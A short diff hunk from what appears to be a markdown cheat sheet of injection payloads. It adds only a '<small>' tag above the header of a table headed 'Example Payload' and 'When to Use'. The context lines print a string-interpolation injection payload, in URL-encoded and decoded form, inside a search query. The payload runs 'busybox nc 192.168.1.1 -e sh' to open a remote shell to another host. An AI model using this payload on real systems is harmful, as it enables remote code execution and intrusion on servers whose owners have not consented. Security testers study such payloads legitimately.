@@ -13,6 +13,7 @@
 Encoded:search?query="%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 -e sh')}"
 Decoded:search?query="${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 -e sh')}"
 
+<small>
 
 | **Type**           | **Example Payload**                                                                                     | **When to Use**                                                        | **How to Know You Can Use It**                                                  |
 |--------------------|----------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------|----------------------------------------------------------------------------------|
